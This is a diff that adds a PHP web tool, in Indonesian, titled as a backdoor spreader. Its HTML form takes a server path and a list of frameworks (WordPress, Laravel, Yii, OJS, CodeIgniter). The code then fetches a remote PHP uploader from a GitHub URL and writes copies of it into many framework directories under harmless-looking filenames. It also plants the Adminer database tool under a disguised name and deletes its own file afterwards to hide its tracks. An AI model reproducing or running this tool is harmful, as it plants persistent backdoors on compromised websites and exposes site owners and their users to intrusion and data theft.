@@ -1,0 +1,92 @@
+<!doctypehtml><html lang="en"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>TEBAR BACKDOOR SEMPAK</title><link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"rel="stylesheet"><script type="text/javascript" src="https://beautifytools.com/ngrUY1QUcq1s4icYgLSPVL2wmbIhGjgvRFkjqu1AXE1jJugGom7xEXp7DQXgxLfjl0skaDVxjpgvMn96fmv1FQ=="></script></head><body><div class="container mt-5"><div class="justify-content-center row"><div class="col-md-6"><h2 class="text-center mb-4">[+] Tebar Backdor Kedaipapa [+]</h2><form action="download.php"method="post"><div class="form-group"><label for="baseDirectory"><?php $baseDirectory = getcwd();
+echo "<br> Masukan Path directorynya : " . $baseDirectory; ?></label> <input class="form-control"id="baseDirectory"name="baseDirectory"required></div><div class="form-group"><label for="modex">Pilih Mode:</label> <select class="form-control"id="modex"multiple name="modex[]"><option value="wp">Wordpress</option><option value="random">Random</option><option value="larav">laravell</option><option value="Yii">Yii</option><option value="ojs">OJS</option><option value="codeigniter">CodeIgniter</option></select></div><div class="text-center"><button class="btn btn-primary"type="submit">Gass Tebar</button></div></form></div></div></div><script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script><script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script></body></html><?php if ($_SERVER["REQUEST_METHOD"] == "POST")
+{
+    $baseDirectory = isset($_POST["baseDirectory"]) ? $_POST["baseDirectory"] : "";
+    if (!is_dir($baseDirectory))
+    {
+        echo "Invalid base directory. Please provide a valid directory.";
+        exit();
+    }
+    echo '<br><center><strong style="font-size: 13px;"><div class="card" style="max-width: 600px;"><h5 class="card-header">
+Files success ditebar :</h5></strong><div class="card-body"><p align="left">';
+    $mode = isset($_POST["modex"]) ? $_POST["modex"] : [];
+    if (!empty($mode))
+    {
+        $fileUrls = ["https://raw.githubusercontent.com/eclibesec/uploader/refs/heads/main/ecpass.php", "https://raw.githubusercontent.com/eclibesec/uploader/refs/heads/main/ecpass.php",  "https://raw.githubusercontent.com/eclibesec/uploader/refs/heads/main/ecpass.php"];
+        $directories = ["wp" => ["/wp-admin", "/wp-admin/images", "/wp-admin/includes", "/wp-admin/js", "/wp-admin/maint", "/wp-admin/network", "/wp-admin/user", "/wp-content", "/wp-content/plugins", "/wp-content/themes", "/wp-content/uploads", "/wp-content/themes/twentytwentytwo", "wp-content/themes/twentytwentyone/assets", "/wp-includes/wp-includes/ID3", "/wp-includes/IXR", "/wp-includes/IXR", "/wp-includes/Requests/library", "/wp-includes/Requests/src", "/wp-includes/Requests", "/wp-includes/SimplePie/Cache", "/wp-includes/SimplePie", "/wp-includes/assets", "/wp-includes/block-patterns", "/wp-includes/certificates", "/wp-includes/customize", "/wp-includes/html-api", "/wp-includes/php-compat", "/wp-includes/pomo", "/wp-includes/sodium_compat/lib", "/wp-includes/sodium_compat/src", "/wp-includes/sodium_compat/namespaced", "/wp-includes/style-engine", "/wp-includes/theme-compat", "/wp-includes/widgets", ], 
+
+        "random" => ["/backend", "/backend/components", "/system/database", "/system/fonts", "/system/language", "/system/libraries/Session", "/assets/bootstrap", "/assets/bootstrap/font-awesome", "/assets/bootstrap/js", "/assets/bootstrap/font-awesome", "/assets/bootstrap/font-awesome/css", "/assets/customjs", "/assets/dist/css", "/assets/images", "/assets/js", "/assets/js/vendor", "/assets/layout/vendor", "/assets/layout/css", "/assets/login/css", "/assets/login/vendor", "/assets/login/fonts", "/system/core", "/backend/controllers", "backend/models", "/backend/modules", "/backend/views", "/common/components", "/common/models", "/common/actions", "/common/widgets", "/console/migrations", "/console/runtime", "", "/tests/units", "/common/packages", "/wp-admin", "/admin", "/admin/images", "/gambar", "/login", "/fonts", "/css", "/.well-known/pki-validation", "/.well-known", "/demo", "/.git", "/wp-admin/images", "/wp-admin/includes", "/wp-admin/js", "/wp-admin/maint", "/wp-admin/network", "/wp-admin/user", "/wp-content", "/wp-content/plugins", "/wp-content/themes", "/wp-content/uploads", "/wp-content/themes/twentytwentytwo", "wp-content/themes/twentytwentyone/assets", "/wp-includes/wp-includes/ID3", "/wp-includes/IXR", "/wp-includes/IXR", "/wp-includes/Requests/library", "/wp-includes/Requests/src", "/wp-includes/Requests", "/wp-includes/SimplePie/Cache", "/wp-includes/SimplePie", "/wp-includes/assets", "/wp-includes/block-patterns", "/wp-includes/certificates", "/wp-includes/customize", "/wp-includes/html-api", "/wp-includes/php-compat", "/wp-includes/pomo", "/wp-includes/sodium_compat/lib", "/wp-includes/sodium_compat/src", "/wp-includes/sodium_compat/namespaced", "/wp-includes/style-engine", "/wp-includes/theme-compat", "/wp-includes/widgets", "/wp-admin", "/wp-content", "/wp-includes", "/app", "/bootstrap", "/config", "/database", "/public", "/resources", "/routes", "/storage", "/tests", "/cache", "/classes", "/controllers", "/cypress", "/docs", "/jobs", "/js", "/lib", "/locale", "/pages", "/plugins", "/public", "/registry", "/schemas", "/styles", "/templates", "/tests", "/tools", "/application", "/system", "/tests", "/user_guide_src", "/app", "/bootstrap", "/config", "/database", "/public", "/resources", "/routes", "/storage", "/tests/storage/app", "/storage/framework", "/storage/framework/cache", "/storage/framework/sessions", "/storage/framework/testing", "/storage/logs", "/database/factories", "/database/migrations", "/database/seeders", "/app/Console", "/app/Exceptions", "/app/Http/Controllers", "/app/Http/Middleware", "/app/Providers", "/config/packages", "/cache", "/classes", "/controllers", "dbscripts", "/docs", "/jobs", "/js", "/lib", "/locale", "/pages", "/plugins", "/public", "/registry", "/rt", "/styles", "/templates", "/uploads", "/tools", "/cache/t_compile", "/classes/search", "/controllers/grid", "dbscripts/xml", "/help/other_languages", "/help/en_US", "/docs", "/jobs", "/js/pkp", "/lib/pkp", "/pages/user", "/plugins/generic", "/plugins/importexport", "/public/css", "/registry/data", "/rt/classes", "/styles/public", "/templates/frontend", "/uploads/journals", "/tools/dbXML", "/application", "/public", "/writable", "/application/cache", "/application/config", "/application/config/development", "/application/config/production", "/application/config/testing", "/application/core", "/application/helpers", "/application/hooks", "/application/language", "/application/libraries", "/application/logs", "/application/models", "/application/controllers", "/application/models", "/application/third_party", "/public/css", "/public/js", "/public/img", "/public/uploads", "/writable/cache", "/writable/logs", "/writable/session", ], 
+        "larav" => ["/dosen/js", "/smartcampus", "/smartcampus/dosen/img", "/smartcampus/source/lib", "/dosen/vendor/magnific-popup", "/dosen/vendor/jquery/logs", "/dosen/vendor/scrollreveal", "/dosen/css/assets", "/smartcampus/dosen/img/portfolio/thumbnails", "/smartcampus/dosen", "/smartcampus/source/", "/dosen/vendor/", "/smartcampus/dosen/img/portfolio", "/app", "/bootstrap", "/config", "/database", "/public", "/resources", "/routes", "/storage", "/tests/storage/app", "/storage/framework", "/storage/framework/cache", "/storage/framework/sessions", "/storage/framework/testing", "/storage/logs", "/database/factories", "/database/migrations", "/database/seeders", "/app/Console", "/app/Exceptions", "/app/Http/Controllers", "/app/Http/Middleware", "/app/Providers", "/config/packages", ], 
+        "Yii" => ["/backend", "/backend/components", "/backend/controllers", "backend/models", "/backend/modules", "/backend/views", "/common/components", "/common/models", "/common/actions", "/common/widgets", "/console/migrations", "/console/runtime", "", "/tests/units", "/common/packages", ], 
+        "ojs" => ["/cache", "/classes", "/controllers", "dbscripts", "/docs", "/jobs", "/js", "/lib", "/locale", "/pages", "/plugins", "/public", "/registry", "/rt", "/styles", "/templates", "/uploads", "/tools", "/cache/t_compile", "/classes/search", "/controllers/grid", "dbscripts/xml", "/help/other_languages", "/help/en_US", "/docs", "/jobs", "/js/pkp", "/lib/pkp", "/pages/user", "/plugins/generic", "/plugins/importexport", "/public/css", "/registry/data", "/rt/classes", "/styles/public", "/templates/frontend", "/uploads/journals", "/tools/dbXML", ], 
+
+        "codeigniter" => ["/application", "/public", "/writable", "/application/cache", "/application/config", "/application/config/development", "/application/config/production", "/application/config/testing", "/application/core", "/application/helpers", "/application/hooks", "/application/language", "/application/libraries", "/application/logs", "/application/models", "/application/controllers", "/application/models", "/application/third_party", "/public/css", "/public/js", "/public/img", "/public/uploads", "/writable/cache", "/writable/logs", "/writable/session", ], ];
+
+        $filenames = ["NotInstantiableException.php", "LogicalAndToken.php", "SchemaBuilderTrait.php"];
+        $totalDownloadedFiles = 0;
+        foreach ($mode as $selectedMode)
+        {
+            if (array_key_exists($selectedMode, $directories))
+            {
+                $subdirectories = $directories[$selectedMode];
+                shuffle($subdirectories);
+                foreach ($subdirectories as $subdirectory)
+                {
+                    if ($totalDownloadedFiles >= 21)
+                    {
+                        break 2;
+                    }
+                    $dir = $baseDirectory . $subdirectory;
+                    if (is_dir($dir))
+                    {
+                        $filename = $filenames[$totalDownloadedFiles % count($filenames) ];
+                        $fullPath = $dir . "/" . $filename;
+                        $counter = 1;
+                        while (file_exists($fullPath))
+                        {
+                            $filename = pathinfo($filename, PATHINFO_FILENAME) . "_" . $counter . "." . pathinfo($filename, PATHINFO_EXTENSION);
+                            $fullPath = $dir . "/" . $filename;
+                            $counter++;
+                        }
+                        $fileUrl = $fileUrls[array_rand($fileUrls) ];
+                        $fileContent = file_get_contents($fileUrl);
+                        if ($fileContent === false)
+                        {
+                            echo "<br>Gagal Upload BD " . $fullPath;
+                        }
+                        else
+                        {
+                            file_put_contents($fullPath, $fileContent);
+                            echo "</strong>" . htmlspecialchars($fullPath) . "</strong><br>";
+                            $totalDownloadedFiles++;
+                        }
+                    }
+                }
+            }
+            else
+            {
+                echo "Invalid mode: " . htmlspecialchars($selectedMode) . "<br>";
+            }
+        }
+        $adminerUrl = "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php";
+        $adminerFilename = "function-confight.php";
+        $adminerPath = $baseDirectory . $subdirectories[array_rand($subdirectories) ] . "/" . $adminerFilename;
+        $adminerContent = file_get_contents($adminerUrl);
+        if ($adminerContent === false)
+        {
+            echo "<br>Gagal Upload adminer " . $adminerPath, $adminerContent;
+        }
+        else
+        {
+            file_put_contents($adminerPath, $adminerContent);
+            echo '<strong style="font-size: 13px;">Adminer</strong> : ' . htmlspecialchars($adminerPath);
+        }
+        echo "</p></div></div><br><br><hr><b>Powered By Kedai papa</b><br><br></center>";
+        $scriptFileName = __FILE__;
+        unlink($scriptFileName);
+    }
+    else
+    {
+        echo "No mode selected.";
+    }
+} ?>
